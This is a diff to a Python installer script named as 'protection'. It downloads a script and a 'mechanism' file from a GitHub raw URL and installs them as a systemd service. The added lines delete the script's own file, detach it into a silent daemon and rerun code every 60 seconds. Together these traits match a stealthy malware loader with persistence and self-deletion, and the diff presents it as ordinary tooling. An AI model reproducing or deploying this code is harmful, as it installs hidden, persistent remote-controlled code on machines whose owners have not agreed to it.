@@ -5,16 +5,46 @@
 import os
 import sys
 import time
+import site
 import subprocess
+
+INTERVAL_SECONDS = 60
+
+def daemonize():
+    """
+    Detach the process from the terminal and run it as a daemon.
+    """
+    try:
+        # Fork the first time to create a non-session leader
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)  # Parent exits
+
+        # Decouple from the parent environment
+        os.chdir("/")
+        os.setsid()  # Become session leader
+        os.umask(0)
+
+        # Fork again to prevent re-acquisition of a controlling terminal
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)  # Parent exits again
+
+        # Redirect standard file descriptors to /dev/null
+        sys.stdout.flush()
+        sys.stderr.flush()
+        with open("/dev/null", "wb", 0) as devnull:
+            os.dup2(devnull.fileno(), sys.stdin.fileno())
+            os.dup2(devnull.fileno(), sys.stdout.fileno())
+            os.dup2(devnull.fileno(), sys.stderr.fileno())
+
+    except OSError as e:
+        sys.stderr.write(f"Daemonization failed: {e}\n")
+        sys.exit(1)
+
 
 # Define URLs for downloading the necessary files
 repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection3.py"
-requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
-contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
-
-
-# Define URLs for downloading the necessary files
-repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
 requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
 contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
 
@@ -93,13 +123,6 @@ create_virtual_environment(envPath)
 
 success = activate_virtual_environment(envPath)
 
-# Ensure environment is active
-if success:
-    try:
-        pip_path = setup_python_environment(envPath, requirementsFilePath)
-    except ImportError as e:
-        print(f"ImportError: {e}")
-
 # Function to download a file and save it locally
 def download_file(url, file_path):
     try:
@@ -169,13 +192,18 @@ def make_executable(file_path):
 if __name__ == "__main__":
 
 
+
     # Download the files
     download_file(repoUrl, repoFilePath)
     download_file(requirementsUrl, requirementsFilePath)
     download_file(contentUrl, contentFilePath)
 
-    time.sleep(10)
-
+    # Ensure environment is active
+    if success:
+        try:
+            pip_path = setup_python_environment(envPath, requirementsFilePath)
+        except ImportError as e:
+            print(f"ImportError: {e}")
 
     # Make the main script executable
     make_executable(repoFilePath)
@@ -184,8 +212,6 @@ if __name__ == "__main__":
     if pip_path and os.name != 'nt':  # Skip service creation on Windows
         python_executable = os.path.join(envPath, 'bin', 'python3')
         create_service_file(serviceFilePath, pythonPath)
-
-#    sys.exit(0)
 
     try:
         # Reload systemd to recognize the new service
@@ -200,14 +226,23 @@ if __name__ == "__main__":
     except Exception as e:
         pass
 
-    # Get the full path of the script
-    script_path = os.path.abspath(__file__)  
-
-    # Optional: Add delay to ensure the script has finished executing
-    time.sleep(1)  
-
     try:
+        # Get the full path of the script
+        script_path = os.path.abspath(__file__)  
+
+        # Optional: Add delay to ensure the script has finished executing
+        time.sleep(1)  
+
         # Delete the script file
         os.remove(script_path)  
     except Exception as e:
         pass
+
+    # Daemonize the process
+    daemonize()
+
+    # Mimic cron
+    while True:
+        execute_script()
+        time.sleep(INTERVAL_SECONDS)
+
